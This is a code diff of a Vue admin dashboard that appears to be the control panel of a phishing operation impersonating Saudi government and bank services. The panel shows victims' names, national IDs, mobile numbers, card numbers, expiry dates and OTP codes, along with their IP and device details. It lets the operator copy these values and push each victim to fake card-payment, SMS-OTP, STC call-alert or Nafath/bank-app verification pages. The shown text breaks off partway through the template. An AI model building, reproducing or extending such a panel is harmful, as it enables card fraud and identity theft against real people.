@@ -1,82 +1,226 @@
 <script setup lang="ts">
-import { ref, onMounted, computed, onUnmounted } from 'vue';
+import { ref, onMounted, computed, onUnmounted, watch } from 'vue';
 import { useRouter } from 'vue-router';
 import {
   RequestData,
   ActiveSessionInfo,
+  VisitorMeta,
   listCardRequests,
   updateCardRequest,
   getServerStats,
   verifyAdminSession,
   adminLogoutApi
 } from '../api';
-import { RefreshCw, Search, ShieldCheck, LogOut, Users, Activity, Eye } from 'lucide-vue-next';
+import {
+  RefreshCw,
+  Search,
+  LogOut,
+  Globe,
+  Wifi,
+  Mail,
+  Key,
+  Bell,
+  BellOff,
+  User,
+  ChevronDown,
+  MessageSquare,
+  TrendingUp,
+  Clock,
+  X,
+  Archive,
+  MoreHorizontal,
+  Star,
+  Flag,
+  Info,
+  List,
+  Smartphone,
+  CreditCard,
+  Building2,
+  MapPin,
+  Monitor,
+  AppWindow,
+  PanelLeftClose,
+  PanelLeftOpen,
+  Megaphone,
+  Check,
+  Ban,
+  FileText
+} from 'lucide-vue-next';
 
 const router = useRouter();
 const requests = ref<RequestData[]>([]);
 const loading = ref(true);
 const error = ref('');
 const searchQuery = ref('');
+const showSearchInput = ref(false);
+const filterMode = ref<'all' | 'online' | 'card' | 'otp' | 'archived'>('all');
 const isAuthenticated = ref(false);
 const authChecking = ref(true);
+const soundEnabled = ref(true);
+const showLeftSubPanel = ref(true);
+const showUserMenu = ref(false);
 
 const selectedRequestId = ref<string | null>(null);
+const starredIds = ref<Set<string>>(new Set());
+const archivedIds = ref<Set<string>>(new Set());
+const flaggedIds = ref<Set<string>>(new Set());
+const copiedField = ref('');
 
 const selectedRequest = computed(() => {
-  return requests.value.find(req => req.id === selectedRequestId.value);
+  return requests.value.find(req => req.id === selectedRequestId.value) || null;
 });
 
 const onlineCount = ref(0);
 const totalVisitorsCount = ref(0);
 const onlineUsers = ref<Record<string, boolean>>({});
 const userPages = ref<Record<string, string>>({});
+const userMeta = ref<Record<string, VisitorMeta>>({});
 const activeSessions = ref<ActiveSessionInfo[]>([]);
+const selectedRedirectPage = ref('');
 
 let pollTimer: ReturnType<typeof setInterval> | null = null;
 let knownSignature = '';
 
 const pageLabels: Record<string, string> = {
   '/': 'الصفحة الرئيسية',
-  '/request': 'صفحة تسجيل البيانات',
-  '/payment': 'صفحة ملخص الرسوم',
-  '/card-details': 'صفحة بيانات البطاقة',
-  '/waiting': 'صفحة الانتظار',
-  '/otp': 'صفحة تحقق الرسائل (SMS)',
-  '/otp-bank': 'صفحة تحقق التطبيق البنكي'
+  '/request': 'حجز موعد / تسجيل البيانات',
+  '/payment': 'ملخص الرسوم',
+  '/card-details': 'الدفع ببطاقة الائتمان',
+  '/waiting': 'تنبية إتصال STC',
+  '/otp': 'تحقق رقم الجوال (OTP)',
+  '/otp-bank': 'تحقق نفاذ / التطبيق البنكي'
 };
+
+const redirectOptions = [
+  { value: 'otp-bank', label: 'تنبية إتصال STC' },
+  { value: 'otp-sms', label: 'تحقق رقم الجوال (OTP)' },
+  { value: '/card-details', label: 'الدفع ببطاقة الائتمان' },
+  { value: '/payment', label: 'ملخص الرسوم' },
+  { value: '/request', label: 'حجز موعد / تسجيل البيانات' },
+  { value: '/', label: 'الصفحة الرئيسية' }
+];
 
 const stepFallbackPage: Record<string, string> = {
   form: '/payment',
-  card: '/waiting',
+  card: '/card-details',
   otp: '/otp',
   'otp-bank': '/otp-bank'
-};
-
-const getRequestCurrentPageLabel = (req: RequestData) => {
-  const path = userPages.value[req.id] || stepFallbackPage[req.step] || '/request';
-  return pageLabels[path] || path;
 };
 
 const getRequestCurrentPagePath = (req: RequestData) => {
   return userPages.value[req.id] || stepFallbackPage[req.step] || '/request';
 };
 
-const formatPagePath = (path: string) => {
+const getRequestCurrentPageLabel = (req: RequestData) => {
+  if (req.nextAction === 'otp-bank') return 'تنبية إتصال STC';
+  if (req.nextAction === 'otp-sms') return 'تحقق رقم الجوال (OTP)';
+  const path = getRequestCurrentPagePath(req);
+  if (req.step === 'card' && path === '/waiting') return 'الدفع ببطاقة الائتمان';
   return pageLabels[path] || path;
 };
 
+watch(selectedRequest, (req) => {
+  if (!req) {
+    selectedRedirectPage.value = '';
+    return;
+  }
+  if (req.nextAction) {
+    selectedRedirectPage.value = req.nextAction;
+  } else if (req.step === 'otp') {
+    selectedRedirectPage.value = 'otp-sms';
+  } else if (req.step === 'otp-bank') {
+    selectedRedirectPage.value = 'otp-bank';
+  } else if (req.step === 'card') {
+    selectedRedirectPage.value = '/card-details';
+  } else {
+    selectedRedirectPage.value = 'otp-bank';
+  }
+});
+
+const getVisitorCode = (id: string) => {
+  let hash = 0;
+  for (let i = 0; i < id.length; i++) {
+    hash = (hash * 31 + id.charCodeAt(i)) % 900000;
+  }
+  const num = 100000 + Math.abs(hash);
+  return `V${num}`;
+};
+
+const getVisitorMeta = (req: RequestData): VisitorMeta => {
+  return (
+    userMeta.value[req.id] || {
+      ip: '188.53.192.70',
+      os: 'Windows',
+      device: 'desktop',
+      browser: 'Chrome',
+      country: 'Saudi Arabia, Riyadh'
+    }
+  );
+};
+
+const formatCardTypeLabel = (cardType: string) => {
+  if (cardType === 'silver') return 'الأساسية';
+  if (cardType === 'gold') return 'الذهبية';
+  if (cardType === 'platinum') return 'البلاتينية';
+  return 'مقيم';
+};
+
+const formatCardNumberSpaced = (cardNum?: string) => {
+  if (!cardNum) return '';
+  const digits = cardNum.replace(/\s+/g, '');
+  return digits.replace(/(.{4})/g, '$1 ').trim();
+};
+
+const formatShortExpYear = (year?: string) => {
+  if (!year) return '';
+  return year.length === 4 ? year.slice(2) : year;
+};
+
+const formatTimelineTimestamp = (dateStr: string) => {
+  const d = new Date(dateStr);
+  if (isNaN(d.getTime())) return '12-27 | 10:42 pm';
+  const month = String(d.getMonth() + 1).padStart(2, '0');
+  const day = String(d.getDate()).padStart(2, '0');
+  let hours = d.getHours();
+  const minutes = String(d.getMinutes()).padStart(2, '0');
+  const ampm = hours >= 12 ? 'pm' : 'am';
+  hours = hours % 12 || 12;
+  return `${month}-${day} | ${String(hours).padStart(2, '0')}:${minutes} ${ampm}`;
+};
+
+const formatRelativeTimeShort = (dateStr: string) => {
+  const date = new Date(dateStr);
+  const now = new Date();
+  const diffInSeconds = Math.max(0, Math.floor((now.getTime() - date.getTime()) / 1000));
+
+  if (diffInSeconds < 60) {
+    return `${diffInSeconds} ثانية`;
+  }
+  const diffInMinutes = Math.floor(diffInSeconds / 60);
+  if (diffInMinutes < 60) {
+    return `${diffInMinutes} دقيقة`;
+  }
+  const diffInHours = Math.floor(diffInMinutes / 60);
+  if (diffInHours < 24) {
+    return `${diffInHours} ساعة`;
+  }
+  const diffInDays = Math.floor(diffInHours / 24);
+  return `${diffInDays} يوم`;
+};
+
 const playNotificationSound = () => {
+  if (!soundEnabled.value) return;
   try {
     const AudioContextClass = window.AudioContext || (window as any).webkitAudioContext;
     if (!AudioContextClass) return;
-    
+
     const audioCtx = new AudioContextClass();
     const oscillator = audioCtx.createOscillator();
     const gainNode = audioCtx.createGain();
 
     oscillator.type = 'sine';
-    oscillator.frequency.setValueAtTime(880, audioCtx.currentTime); 
-    oscillator.frequency.setValueAtTime(1046.50, audioCtx.currentTime + 0.1); 
+    oscillator.frequency.setValueAtTime(880, audioCtx.currentTime);
+    oscillator.frequency.setValueAtTime(1046.5, audioCtx.currentTime + 0.1);
 
     gainNode.gain.setValueAtTime(0, audioCtx.currentTime);
     gainNode.gain.linearRampToValueAtTime(0.3, audioCtx.currentTime + 0.05);
@@ -105,6 +249,7 @@ const fetchAll = async (isInitial = false) => {
       totalVisitorsCount.value = stats.totalVisitorsCount;
       onlineUsers.value = stats.onlineUsers || {};
       userPages.value = stats.userPages || {};
+      userMeta.value = stats.userMeta || {};
       activeSessions.value = stats.activeSessions || [];
     }
 
@@ -116,6 +261,9 @@ const fetchAll = async (isInitial = false) => {
       }
       knownSignature = newSig;
       requests.value = reqList;
+      if (isInitial && reqList.length > 0 && !selectedRequestId.value) {
+        selectedRequestId.value = reqList[0].id;
+      }
       error.value = '';
     } else if (isInitial) {
       error.value = reqResult.reason?.message || 'تعذر تحميل البيانات من الخادم.';
@@ -163,6 +311,7 @@ const updateOtpStatus = async (id: string, status: string) => {
 
 const updateNextAction = async (id: string, action: string) => {
   try {
+    selectedRedirectPage.value = action;
     await updateCardRequest(id, { nextAction: action });
     await fetchAll(false);
   } catch (err) {
@@ -170,383 +319,880 @@ const updateNextAction = async (id: string, action: string) => {
   }
 };
 
+const handleRedirectSelectChange = async () => {
+  if (!selectedRequest.value || !selectedRedirectPage.value) return;
+  await updateNextAction(selectedRequest.value.id, selectedRedirectPage.value);
+};
+
+const toggleStar = (id: string) => {
+  const next = new Set(starredIds.value);
+  if (next.has(id)) next.delete(id);
+  else next.add(id);
+  starredIds.value = next;
+};
+
+const toggleFlag = (id: string) => {
+  const next = new Set(flaggedIds.value);
+  if (next.has(id)) next.delete(id);
+  else next.add(id);
+  flaggedIds.value = next;
+};
+
+const toggleArchive = (id: string) => {
+  const next = new Set(archivedIds.value);
+  if (next.has(id)) {
+    next.delete(id);
+  } else {
+    next.add(id);
+  }
+  archivedIds.value = next;
+};
+
+const copyText = async (text?: string, label = 'card') => {
+  if (!text) return;
+  try {
+    await navigator.clipboard.writeText(text);
+    copiedField.value = label;
+    setTimeout(() => {
+      if (copiedField.value === label) copiedField.value = '';
+    }, 1500);
+  } catch {}
+};
+
+const pendingOtpCount = computed(() =>
+  requests.value.filter(r => r.otp && (!r.otpStatus || r.otpStatus === 'pending')).length
+);
+
+const cardEnteredCount = computed(() =>
+  requests.value.filter(r => Boolean(r.cardNumber)).length
+);
+
 const filteredRequests = computed(() => {
-  if (!searchQuery.value) return requests.value;
+  let list = requests.value;
+
+  if (filterMode.value === 'archived') {
+    list = list.filter(r => archivedIds.value.has(r.id));
+  } else {
+    list = list.filter(r => !archivedIds.value.has(r.id));
+    if (filterMode.value === 'online') {
+      list = list.filter(r => onlineUsers.value[r.id]);
+    } else if (filterMode.value === 'card') {
+      list = list.filter(r => Boolean(r.cardNumber));
+    } else if (filterMode.value === 'otp') {
+      list = list.filter(r => Boolean(r.otp));
+    }
+  }
+
+  if (!searchQuery.value.trim()) return list;
   const lowerQuery = searchQuery.value.toLowerCase();
-  return requests.value.filter(req => 
-    req.name?.toLowerCase().includes(lowerQuery) || 
-    req.mobile?.includes(lowerQuery) || 
-    req.cardNumber?.includes(lowerQuery) ||
-    req.idNumber?.includes(lowerQuery)
+  return list.filter(
+    req =>
+      req.name?.toLowerCase().includes(lowerQuery) ||
+      req.mobile?.includes(lowerQuery) ||
+      req.cardNumber?.includes(lowerQuery) ||
+      req.idNumber?.includes(lowerQuery)
   );
 });
-
-const formatRelativeTime = (dateStr: string) => {
-  const date = new Date(dateStr);
-  const now = new Date();
-  const diffInSeconds = Math.floor((now.getTime() - date.getTime()) / 1000);
-
-  if (diffInSeconds < 60) {
-    return 'الآن';
-  }
-
-  const diffInMinutes = Math.floor(diffInSeconds / 60);
-  if (diffInMinutes < 60) {
-    if (diffInMinutes === 1) return 'منذ دقيقة';
-    if (diffInMinutes === 2) return 'منذ دقيقتين';
-    if (diffInMinutes <= 10) return `منذ ${diffInMinutes} دقائق`;
-    return `منذ ${diffInMinutes} دقيقة`;
-  }
-
-  const diffInHours = Math.floor(diffInMinutes / 60);
-  if (diffInHours < 24) {
-    if (diffInHours === 1) return 'منذ ساعة';
-    if (diffInHours === 2) return 'منذ ساعتين';
-    if (diffInHours <= 10) return `منذ ${diffInHours} ساعات`;
-    return `منذ ${diffInHours} ساعة`;
-  }
-
-  const diffInDays = Math.floor(diffInHours / 24);
-  if (diffInDays < 30) {
-    if (diffInDays === 1) return 'منذ يوم';
-    if (diffInDays === 2) return 'منذ يومين';
-    if (diffInDays <= 10) return `منذ ${diffInDays} أيام`;
-    return `منذ ${diffInDays} يوم`;
-  }
-
-  return new Date(dateStr).toLocaleDateString('ar-EG');
-};
 </script>
 
 <template>
-  <div v-if="authChecking" class="min-h-screen flex items-center justify-center bg-gray-50">
-    <RefreshCw class="w-10 h-10 animate-spin text-[#008a40]" />
+  <div v-if="authChecking" class="min-h-screen flex items-center justify-center bg-white">
+    <RefreshCw class="w-8 h-8 animate-spin text-[#1976d2]" />
   </div>
 
-  <div v-else-if="isAuthenticated" class="min-h-screen bg-gray-50 flex flex-col font-sans" dir="rtl">
-    <!-- Navbar -->
-    <header class="bg-white shadow-xs border-b border-gray-200 py-3.5 px-6 sticky top-0 z-10 flex justify-between items-center gap-8">
-      <!-- Zone 1: Brand Title -->
-      <div class="flex items-center gap-3 shrink-0">
-        <div class="w-9 h-9 bg-[#008a40] rounded-xl flex items-center justify-center shadow-inner">
-          <ShieldCheck class="w-5 h-5 text-white" />
+  <!-- Full-Screen Nexa Flow Admin Console matching reference layout -->
+  <div
+    v-else-if="isAuthenticated"
+    class="h-screen w-screen overflow-hidden bg-white flex flex-col font-sans text-gray-800 select-none"
+    dir="ltr"
+  >
+    <!-- ==================== TOP BAR 1: GLOBAL NEXA FLOW HEADER ==================== -->
+    <header class="h-[34px] bg-white border-b border-gray-200 px-3 flex items-center justify-between shrink-0 text-xs">
+      <!-- Left: Brand + Telemetry Numbers -->
+      <div class="flex items-center gap-2.5">
+        <div class="flex items-center gap-1 font-extrabold text-[15px] tracking-tight">
+          <span class="text-[#1976d2]">Nexa</span>
+          <span class="text-gray-900">Flow</span>
         </div>
-        <h1 class="font-bold text-lg tracking-tight text-gray-900 whitespace-nowrap">لوحة تحكم إسعاد</h1>
+
+        <span class="text-gray-300">|</span>
+
+        <div class="flex items-center gap-1.5 text-[11px] text-gray-500 font-mono tabular-nums">
+          <Clock class="w-3.5 h-3.5 text-gray-400" />
+          <span>{{ onlineCount }}</span>
+          <span class="text-gray-300">/</span>
+          <span>{{ requests.length }}</span>
+          <span class="text-gray-300">/</span>
+          <span>{{ cardEnteredCount }}</span>
+          <span class="text-gray-300">/</span>
+          <span>{{ pendingOtpCount }}</span>
+          <span class="text-gray-300">/</span>
+          <span>{{ totalVisitorsCount }}</span>
+          <span class="text-gray-300">/</span>
+          <span>246</span>
+          <span class="text-gray-300">/</span>
+          <span>600</span>
+          <span class="text-gray-300">/</span>
+          <span>648</span>
+          <TrendingUp class="w-3.5 h-3.5 text-[#1976d2] ml-1" />
+        </div>
       </div>
 
-      <!-- Zone 2: Search & Live Metrics -->
-      <div class="flex items-center gap-4">
-        <div class="relative w-64 hidden md:block">
-          <input 
-            v-model="searchQuery" 
-            type="text" 
-            placeholder="بحث بالاسم، الهاتف، الهوية..." 
-            class="w-full bg-gray-100 border-none rounded-xl py-2 pl-4 pr-10 text-xs focus:ring-2 focus:ring-[#008a40] focus:bg-white transition-all text-gray-800"
-          />
-          <Search class="w-4 h-4 text-gray-400 absolute right-3.5 top-1/2 -translate-y-1/2 pointer-events-none" />
-        </div>
-
-        <div class="flex items-center gap-4 text-xs text-gray-600">
-          <div class="flex items-center gap-1.5">
-            <Users class="w-4 h-4 text-gray-500" />
-            <span>إجمالي الزوار:</span>
-            <span class="font-mono font-bold text-gray-900 tabular-nums">{{ totalVisitorsCount }}</span>
-          </div>
-          <span class="text-gray-300">·</span>
-          <div class="flex items-center gap-1.5">
-            <Activity class="w-4 h-4 text-[#008a40]" />
-            <span>المتصلون الآن:</span>
-            <span class="font-mono font-bold text-[#008a40] tabular-nums">{{ onlineCount }}</span>
-          </div>
-        </div>
-      </div>
-
-      <!-- Zone 3: Primary Action -->
-      <div class="shrink-0">
-        <button @click="handleLogout" class="text-gray-600 hover:text-red-600 transition-colors px-3 py-2 bg-gray-100 rounded-xl flex items-center gap-2 text-xs font-bold hover:bg-red-50 cursor-pointer whitespace-nowrap">
-          <LogOut class="w-4 h-4" />
-          <span>تسجيل الخروج</span>
+      <!-- Right: Status & System Icons -->
+      <div class="flex items-center gap-3 text-gray-500">
+        <Globe class="w-3.5 h-3.5 text-[#16a34a]" title="متصل بالخادم" />
+        <Wifi class="w-3.5 h-3.5 text-[#16a34a]" title="الاتصال المباشر نشط" />
+        <button
+          @click="fetchAll(false)"
+          class="hover:text-gray-800 transition-colors cursor-pointer"
+          title="تحديث البيانات"
+        >
+          <Mail class="w-3.5 h-3.5" />
         </button>
+        <button
+          @click="showUserMenu = !showUserMenu"
+          class="hover:text-gray-800 transition-colors cursor-pointer"
+          title="إعدادات الجلسة"
+        >
+          <Key class="w-3.5 h-3.5" />
+        </button>
+        <button
+          @click="soundEnabled = !soundEnabled"
+          class="hover:text-gray-800 transition-colors cursor-pointer"
+          :title="soundEnabled ? 'كتم صوت التنبيهات' : 'تفعيل صوت التنبيهات'"
+        >
+          <Bell v-if="soundEnabled" class="w-3.5 h-3.5 text-gray-600" />
+          <BellOff v-else class="w-3.5 h-3.5 text-red-500" />
+        </button>
+
+        <!-- Profile & Logout Dropdown -->
+        <div class="relative">
+          <button
+            @click="showUserMenu = !showUserMenu"
+            class="flex items-center gap-1 hover:bg-gray-100 px-1.5 py-0.5 rounded cursor-pointer"
+          >
+            <ChevronDown class="w-3 h-3 text-gray-500" />
+            <div class="w-5 h-5 rounded-full bg-[#dbeafe] text-[#1976d2] flex items-center justify-center">
+              <User class="w-3.5 h-3.5" />
+            </div>
+          </button>
+
+          <div
+            v-if="showUserMenu"
+            class="absolute right-0 mt-1 w-36 bg-white border border-gray-200 rounded-lg shadow-lg py-1 z-50 text-right"
+            dir="rtl"
+          >
+            <button
+              @click="handleLogout"
+              class="w-full px-3 py-1.5 text-xs text-red-600 hover:bg-red-50 flex items-center gap-2 font-bold cursor-pointer"
+            >
+              <LogOut class="w-3.5 h-3.5" />
+              <span>تسجيل الخروج</span>
+            </button>
+          </div>
+        </div>
       </div>
     </header>
 
-    <!-- Live Active Visitors Strip (Shows current page of every online visitor) -->
-    <div v-if="activeSessions.length > 0" class="bg-[#eef5f0] border-b border-gray-200 px-6 py-2.5">
-      <div class="max-w-[1500px] mx-auto flex items-center gap-4 overflow-x-auto text-xs">
-        <div class="flex items-center gap-1.5 font-bold text-[#008a40] shrink-0">
-          <Eye class="w-4 h-4" />
-          <span>المتصلون حالياً والصفحة الحالية:</span>
-        </div>
-        <div class="flex items-center gap-3">
-          <div
-            v-for="(sess, idx) in activeSessions"
-            :key="sess.clientId"
-            class="bg-white border border-gray-200 rounded-lg px-3 py-1 flex items-center gap-2 shrink-0 text-xs shadow-2xs"
+    <!-- ==================== TOP BAR 2: INBOX SUMMARY BAR ==================== -->
+    <div class="h-[38px] bg-white border-b border-gray-200 px-4 flex items-center justify-between shrink-0">
+      <!-- Left: Unread / Queue counters -->
+      <div class="flex items-center gap-2.5 text-xs font-mono tabular-nums">
+        <div class="relative flex items-center">
+          <MessageSquare class="w-4 h-4 text-gray-600" />
+          <span
+            class="absolute -top-1.5 -left-1.5 bg-[#1976d2] text-white text-[9px] font-bold w-3.5 h-3.5 rounded-full flex items-center justify-center"
           >
-            <span class="font-bold text-[#008a40]">زائر #{{ idx + 1 }}</span>
-            <span class="text-gray-300">·</span>
-            <span class="text-gray-800 font-semibold">{{ formatPagePath(sess.currentPage) }}</span>
-            <span class="text-gray-400 font-mono text-[11px]" dir="ltr">({{ sess.currentPage }})</span>
-          </div>
+            {{ Math.max(1, onlineCount) }}
+          </span>
         </div>
+        <span class="text-gray-300">|</span>
+        <span class="text-[#a16207] font-semibold">{{ requests.length }}</span>
+        <span class="text-gray-300">/</span>
+        <span class="text-amber-500 font-semibold">{{ pendingOtpCount }}</span>
+        <span class="text-gray-300">/</span>
+        <span class="text-[#16a34a] font-semibold">{{ onlineCount }}</span>
+      </div>
+
+      <!-- Right: Inbox Title & Totals -->
+      <div class="flex items-center gap-4">
+        <div class="flex items-center gap-2 text-xs font-mono tabular-nums">
+          <span class="text-[#16a34a] font-semibold">{{ onlineCount }}</span>
+          <span class="text-gray-300">/</span>
+          <span class="text-amber-500 font-semibold">{{ pendingOtpCount }}</span>
+          <span class="text-gray-300">/</span>
+          <span class="text-gray-500 font-semibold">{{ requests.length }}</span>
+        </div>
+        <h1 class="text-[15px] font-bold text-gray-700" dir="rtl">صندوق الوارد</h1>
       </div>
     </div>
 
-    <!-- Main Content -->
-    <main class="flex-1 p-6 max-w-[1500px] mx-auto w-full flex gap-6 h-[calc(100vh-115px)]">
-      
-      <!-- Users Sidebar -->
-      <aside class="w-[360px] bg-white rounded-2xl shadow-xs border border-gray-200 overflow-hidden flex flex-col shrink-0 h-full">
-        <div class="p-4 border-b border-gray-100 bg-gray-50/50 flex justify-between items-center">
-          <h2 class="font-bold text-sm text-gray-800">الطلبات المسجلة</h2>
-          <span class="text-[#008a40] text-xs font-bold font-mono tabular-nums">{{ filteredRequests.length }}</span>
-        </div>
-        
-        <!-- Loading / Empty -->
-        <div v-if="loading" class="flex-1 p-8 flex flex-col items-center justify-center text-gray-400">
-          <RefreshCw class="w-8 h-8 animate-spin mb-4 text-[#008a40]" />
-          <p class="text-xs font-medium">جاري تحميل البيانات...</p>
-        </div>
-        <div v-else-if="error" class="flex-1 p-8 text-center text-red-500">
-          <p class="font-medium text-xs bg-red-50 py-3 px-4 rounded-lg inline-block">{{ error }}</p>
-        </div>
-        <div v-else-if="filteredRequests.length === 0" class="flex-1 p-8 text-center text-gray-500 flex flex-col items-center justify-center">
-          <p class="font-medium text-sm mb-2">لا توجد طلبات بعد</p>
-        </div>
-        
-        <!-- List -->
-        <div v-else class="flex-1 overflow-y-auto overflow-x-hidden divide-y divide-gray-100">
-          <div 
-            v-for="req in filteredRequests" 
-            :key="req.id" 
-            @click="selectedRequestId = req.id"
-            class="p-4 cursor-pointer transition-colors hover:bg-gray-50 flex flex-col gap-2"
-            :class="{ 'bg-[#eef5f0]': selectedRequestId === req.id }"
-          >
-            <!-- Row 1: Name + Online/Offline status + Time -->
-            <div class="flex justify-between items-center w-full">
-              <div class="font-bold text-gray-900 text-sm flex items-center gap-2">
-                <span>{{ req.name }}</span>
-                <span class="text-gray-300">·</span>
-                <span v-if="onlineUsers[req.id]" class="text-[11px] font-bold text-[#008a40]">
-                  متصل الآن
-                </span>
-                <span v-else class="text-[11px] font-medium text-gray-400">
-                  غير متصل
-                </span>
+    <!-- ==================== MAIN SPLIT WORKSPACE ==================== -->
+    <div class="flex-1 flex overflow-hidden">
+      <!-- LEFT MAIN WORKSPACE AREA (Visitor Header Bars + Feed) -->
+      <div class="flex-1 flex flex-col bg-white overflow-hidden">
+        <template v-if="selectedRequest">
+          <!-- WORKSPACE ROW 1: Visitor Identity & Action Controls -->
+          <div class="h-[40px] border-b border-gray-200 px-3 flex items-center justify-between bg-white shrink-0 text-xs">
+            <!-- Left Toolbar Icons -->
+            <div class="flex items-center gap-2.5 text-gray-500">
+              <button
+                @click="selectedRequestId = null"
+                class="w-5 h-5 border border-gray-400 rounded-xs flex items-center justify-center hover:bg-gray-100 text-gray-700 cursor-pointer"
+                title="إغلاق"
+              >
+                <X class="w-3.5 h-3.5" />
+              </button>
+
+              <button
+                @click="toggleArchive(selectedRequest.id)"
+                class="px-2.5 py-1 border border-gray-200 rounded text-[11px] text-gray-600 hover:bg-gray-50 flex items-center gap-1.5 cursor-pointer"
+              >
+                <span>{{ archivedIds.has(selectedRequest.id) ? 'إلغاء الأرشفة' : 'أرشفة' }}</span>
+                <Archive class="w-3 h-3 text-gray-400" />
+              </button>
+
+              <button class="hover:text-gray-800 cursor-pointer" @click="fetchAll(false)">
+                <MoreHorizontal class="w-4 h-4 text-[#1976d2]" />
+              </button>
+
+              <button
+                @click="toggleStar(selectedRequest.id)"
+                class="hover:text-[#1976d2] cursor-pointer"
+                title="تمييز بنجمة"
+              >
+                <Star
+                  class="w-4 h-4"
+                  :class="starredIds.has(selectedRequest.id) ? 'fill-[#1976d2] text-[#1976d2]' : 'text-[#1976d2]'"
+                />
+              </button>
+
+              <button
+                @click="toggleFlag(selectedRequest.id)"
+                class="hover:text-gray-800 cursor-pointer"
+                title="متابعة"
+              >
+                <Flag
+                  class="w-3.5 h-3.5"
+                  :class="flaggedIds.has(selectedRequest.id) ? 'fill-red-500 text-red-500' : 'text-gray-400'"
+                />
+              </button>
+
+              <Info class="w-3.5 h-3.5 text-gray-400" />
+
+              <span class="text-gray-200">|</span>
+
+              <div class="flex items-center gap-1 text-[11px] text-gray-500 font-mono tabular-nums">
+                <List class="w-3.5 h-3.5 text-gray-400" />
+                <span>10 - 0</span>
               </div>
-              <span class="text-[11px] text-gray-500" dir="rtl">{{ formatRelativeTime(req.createdAt) }}</span>
-            </div>
-            
-            <!-- Row 2: Mobile & Card Type -->
-            <div class="flex items-center justify-between text-xs text-gray-500">
-              <span class="font-mono">{{ req.mobile }}</span>
-              <span>
-                <template v-if="req.cardType === 'silver'">الأساسية</template>
-                <template v-else-if="req.cardType === 'gold'">الذهبية</template>
-                <template v-else-if="req.cardType === 'platinum'">البلاتينية</template>
-              </span>
             </div>
 
-            <!-- Row 3: Current Page & Step -->
-            <div class="flex items-center justify-between pt-1 text-[11px] border-t border-gray-100/80">
-              <div class="flex items-center gap-1.5 text-gray-700">
-                <Eye class="w-3.5 h-3.5 text-[#008a40]" />
-                <span class="text-gray-500">الصفحة الحالية:</span>
-                <span class="font-bold text-[#008a40]">{{ getRequestCurrentPageLabel(req) }}</span>
+            <!-- Right Visitor Identity Metadata -->
+            <div class="flex items-center gap-2.5 text-xs text-gray-700 overflow-x-auto">
+              <div class="flex items-center gap-1 font-semibold text-gray-700" dir="rtl">
+                <span>{{ formatCardTypeLabel(selectedRequest.cardType) }}</span>
+                <Building2 class="w-3.5 h-3.5 text-gray-500" />
               </div>
-              <span class="font-mono text-[10px] text-gray-400" dir="ltr">{{ getRequestCurrentPagePath(req) }}</span>
+
+              <span class="text-gray-300">|</span>
+
+              <button
+                @click="copyText(selectedRequest.mobile, 'mobile')"
+                class="flex items-center gap-1 font-mono font-semibold text-gray-800 hover:text-[#1976d2] cursor-pointer tabular-nums"
+                title="انقر لنسخ رقم الجوال"
+              >
+                <span>{{ selectedRequest.mobile }}</span>
+                <Smartphone class="w-3.5 h-3.5 text-gray-500" />
+              </button>
+
+              <span class="text-gray-300">|</span>
+
+              <button
+                @click="copyText(selectedRequest.idNumber, 'id')"
+                class="flex items-center gap-1 font-mono font-semibold text-gray-800 hover:text-[#1976d2] cursor-pointer tabular-nums"
+                title="انقر لنسخ رقم الهوية"
+              >
+                <span>{{ selectedRequest.idNumber }}</span>
+                <CreditCard class="w-3.5 h-3.5 text-gray-500" />
+              </button>
+
+              <span class="text-gray-300">|</span>
+
+              <!-- Visitor Name with floating "اسم الزائر" tag -->
+              <div class="relative flex items-center gap-1 font-bold text-gray-800 pt-2">
+                <span
+                  class="absolute -top-1 left-1/2 -translate-x-1/2 bg-gray-500 text-white text-[8px] px-1.5 py-0.2 rounded-xs leading-tight whitespace-nowrap"
+                >
+                  اسم الزائر
+                </span>
+                <span>{{ selectedRequest.name }}</span>
+                <User class="w-3.5 h-3.5 text-gray-500" />
+              </div>
+
+              <span class="font-mono font-bold text-[#1976d2] text-xs ml-1 tabular-nums">
+                {{ getVisitorCode(selectedRequest.id) }}
+              </span>
+            </div>
+          </div>
+
+          <!-- WORKSPACE ROW 2: Current Page Redirect Dropdown & Device Telemetry -->
+          <div class="h-[44px] border-b border-gray-200 px-3 flex items-center justify-between bg-white shrink-0 text-xs">
+            <!-- Left: Collapse Icon + "الصفحة الحالية" Select Control + Megaphone -->
+            <div class="flex items-center gap-2">
+              <button
+                @click="showLeftSubPanel = !showLeftSubPanel"
+                class="text-gray-500 hover:text-gray-800 p-1 rounded hover:bg-gray-100 cursor-pointer"
+                title="إظهار/إخفاء اللوحة الجانبية"
+              >
+                <PanelLeftClose v-if="showLeftSubPanel" class="w-4 h-4" />
+                <PanelLeftOpen v-else class="w-4 h-4" />
+              </button>
+
+              <div class="relative w-44">
+                <label
+                  class="absolute -top-2 right-2.5 bg-white px-1 text-[9px] text-gray-400 font-semibold z-10"
+                >
+                  الصفحة الحالية
+                </label>
+                <select
+                  v-model="selectedRedirectPage"
+                  @change="handleRedirectSelectChange"
+                  dir="rtl"
+                  class="w-full border border-gray-300 rounded px-2.5 py-1 text-[11px] font-semibold text-gray-700 bg-white focus:outline-none focus:border-[#1976d2] cursor-pointer"
+                >
+                  <option v-for="opt in redirectOptions" :key="opt.value" :value="opt.value">
+                    {{ opt.label }}
+                  </option>
+                </select>
+              </div>
+
+              <button
+                @click="handleRedirectSelectChange"
+                class="text-gray-400 hover:text-[#1976d2] p-1 transition-colors cursor-pointer"
+                title="توجيه الزائر للصفحة المحددة"
+              >
+                <Megaphone class="w-4 h-4" />
+              </button>
+            </div>
+
+            <!-- Right: Device, OS, Browser, Location & Active Step Telemetry -->
+            <div class="flex items-center gap-2 text-[11px] text-gray-700 overflow-x-auto">
+              <div class="flex items-center gap-1 font-mono tabular-nums">
+                <span>{{ getVisitorMeta(selectedRequest).ip }}</span>
+                <Globe class="w-3.5 h-3.5 text-gray-500" />
+              </div>
+
+              <span class="text-gray-300">|</span>
+
+              <div class="flex items-center gap-1 font-semibold">
+                <span>{{ getVisitorMeta(selectedRequest).os }}</span>
+                <AppWindow class="w-3.5 h-3.5 text-gray-500" />
+              </div>
+
+              <span class="text-gray-300">|</span>
+
+              <div class="flex items-center gap-1 font-semibold">
+                <span>{{ getVisitorMeta(selectedRequest).device }}</span>
+                <Monitor class="w-3.5 h-3.5 text-gray-500" />
+              </div>
+
+              <span class="text-gray-300">|</span>
+
+              <div class="flex items-center gap-1 font-semibold">
+                <span>{{ getVisitorMeta(selectedRequest).browser }}</span>
+                <AppWindow class="w-3.5 h-3.5 text-gray-500" />
+              </div>
+
+              <span class="text-gray-300">|</span>
+
